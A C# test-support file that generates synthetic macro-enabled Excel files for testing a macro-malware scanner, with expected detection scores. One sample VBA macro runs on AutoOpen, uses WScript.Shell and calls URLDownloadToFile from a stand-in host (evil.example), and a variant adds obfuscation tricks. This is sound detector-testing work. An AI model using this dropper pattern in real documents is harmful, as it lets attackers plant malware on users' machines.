using System.Text;
using OpenMcdf;
using OpenMcdfVersion = OpenMcdf.Version;

namespace OfficeSelfSigningPortal.TestSupport;

/// <summary>
/// Synthetischer Testkorpus für den Scan-Orchestrator (AK-47): minimale, aber
/// strukturvalide Makro-Dateien — OOXML-Paket (Zip) mit CFB-vbaProject.bin
/// (VBA-Speicher mit dir-/PROJECT- und Modul-Streams, MS-OVBA-Store-only-RLE).
/// Aufbau und Quelltexte sind fix, damit Scores deterministisch aus Anhang D
/// ableitbar sind.
/// </summary>
public static class ScanCorpus
{
    private const string DirStreamName = "dir";
    private const string ProjectStreamName = "PROJECT";

    /// <summary>Minimaler dir-Stream-Inhalt (wird RLE-komprimiert abgelegt).</summary>
    private static readonly byte[] MinimalDir = Array.Empty<byte>();

    /// <summary>Makro ohne verdächtige Merkmale — erwarteter Score 10 (Clean).</summary>
    public const string CleanSource = """
        Attribute VB_Name = "Module1"
        Sub Hello()
            MsgBox "Hello"
        End Sub
        """;

    /// <summary>
    /// Makro mit AutoExec + allen vier Verhaltens-Gruppen + mraptor —
    /// erwarteter Score 10+15+30 (Verhaltens-Cap) +30 (mraptor) = 85.
    /// </summary>
    public const string VerhaltensSource = """
        Attribute VB_Name = "Module1"
        Sub AutoOpen()
            Dim o As Object
            Set o = CreateObject("WScript.Shell")
            o.Exec "calc.exe"
            Dim f As Object
            Set f = CreateObject("Scripting.FileSystemObject")
            f.CreateTextFile "C:\Temp\drop.exe"
            Call URLDownloadToFile(0, "http://evil.example/x.exe", "C:\Temp\x.exe", 0, 0)
        End Sub
        """;

    /// <summary>Verhaltens-Quelltext plus alle vier Obfuscation-Typen — Score 85+25 = 110 → Clamp 100 (Malicious).</summary>
    public const string ObfuskationsSource = VerhaltensSource + """
        Sub Obf()
            Dim a As String
            a = "&H4D&H5A&H90&H00&H01&H02&H03&H04"
            a = a & StrReverse("llehS.tpircSW")
            a = a & "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoQUJDREVGR0hJSktMTU5PUA=="
            a = a & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(32)
            a = a & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110)
        End Sub
        """;

    /// <summary>Baut eine .xlsm-OOXML-Datei mit den angegebenen VBA-Modulen (Default-Layout xl/vbaProject.bin).</summary>
    public static byte[] CreateXlsm(params string[] moduleSources) =>
        CreateOoxmlMacroFile(BuildVbaProject(moduleSources, encryptedDir: false));

    /// <summary>Baut eine Datei, deren dir-Stream kein valider RLE-Container ist (verschlüsseltes/ungültiges VBA-Projekt, AK-45).</summary>
    public static byte[] CreateEncryptedVbaXlsm() =>
        CreateOoxmlMacroFile(BuildVbaProject([CleanSource], encryptedDir: true));

    /// <summary>Baut eine Datei mit beliebigem (ggf. ungültigem) vbaProject.bin-Rohinhalt.</summary>
    public static byte[] CreateXlsmWithRawVbaProject(byte[] vbaProjectBytes) =>
        CreateOoxmlMacroFile(vbaProjectBytes);

    /// <summary>Baut eine makrofreie OOXML-Datei (kein vbaProject.bin).</summary>
    public static byte[] CreateMacroFreeXlsm() => CreateOoxmlMacroFile(null);

    private static byte[] CreateOoxmlMacroFile(byte[]? vbaProject)
    {
        using var package = new MemoryStream();
        using (var zip = new System.IO.Compression.ZipArchive(package, System.IO.Compression.ZipArchiveMode.Create, leaveOpen: true))
        {
            AddEntry(zip, "[Content_Types].xml", """
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
                  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
                </Types>
                """);
            AddEntry(zip, "xl/workbook.xml", "<xml/>");
            if (vbaProject is not null)
            {
                AddEntry(zip, "xl/vbaProject.bin", vbaProject);
            }
        }

        return package.ToArray();
    }

    /// <summary>Baut das CFB-vbaProject.bin: Root-VBA-Speicher mit dir und Modul-Streams; PROJECT am Root.</summary>
    public static byte[] BuildVbaProject(string[] moduleSources, bool encryptedDir)
    {
        // OpenMcdf 3.x: CompoundFile + RootStorage.AddStorage/AddStream + Save → RootStorage.Create +
        // CreateStorage/CreateStream + Write + Flush; LeaveOpen lässt den zugrundeliegenden
        // Stream nach Dispose lesbar (2.4.1 schloss die Save-Stream-Repräsentation erst nach Save()).
        var output = new MemoryStream();
        using (var compound = RootStorage.Create(output, OpenMcdfVersion.V3, StorageModeFlags.Transacted | StorageModeFlags.LeaveOpen))
        {
            var vba = compound.CreateStorage("VBA");
            WriteStream(vba, DirStreamName, encryptedDir
                ? new byte[] { 0xDE, 0xAD, 0xBE, 0xEF, 0x42, 0x42, 0x42, 0x42 }
                : VbaRleCompressor.CompressStoreOnly(MinimalDir));

            for (var i = 0; i < moduleSources.Length; i++)
            {
                WriteStream(vba, ModuleName(i), VbaRleCompressor.CompressStoreOnly(Encoding.ASCII.GetBytes(moduleSources[i])));
            }

            WriteStream(compound, ProjectStreamName, Encoding.ASCII.GetBytes(BuildProjectText(moduleSources.Length)));

            // Transacted-Modus verlangt expliziten Commit, sonst bleiben die geschriebenen
            // Sektoren im CFB-Speicher und die Reopen-Leseversuche lesen leere Streams /
            // scheitern mit EndOfStreamException (im Proto verifiziert).
            compound.Commit();
        }

        return output.ToArray();

        // OpenMcdf 3.x CfbStream muss disposed werden, bevor der Root die finalen Sektoren
        // schreibt — sonst sind die geschriebenen Bytes beim Reopen leer (im Proto verifiziert).
        static void WriteStream(OpenMcdf.Storage parent, string name, byte[] data)
        {
            using var stream = parent.CreateStream(name);
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }
    }

    private static string ModuleName(int index) => $"Module{index + 1}";

    private static string BuildProjectText(int moduleCount)
    {
        var builder = new StringBuilder();
        builder.AppendLine("[ID]");
        builder.AppendLine("ID=\"{11111111-2222-3333-4444-555555555555}\"");
        builder.AppendLine("[Modules]");
        for (var i = 0; i < moduleCount; i++)
        {
            builder.Append(ModuleName(i)).Append('=').AppendLine(ModuleName(i));
        }

        return builder.ToString();
    }

    private static void AddEntry(System.IO.Compression.ZipArchive zip, string name, string content) =>
        AddEntry(zip, name, Encoding.UTF8.GetBytes(content));

    private static void AddEntry(System.IO.Compression.ZipArchive zip, string name, byte[] content)
    {
        var entry = zip.CreateEntry(name);
        using var stream = entry.Open();
        stream.Write(content, 0, content.Length);
    }
}
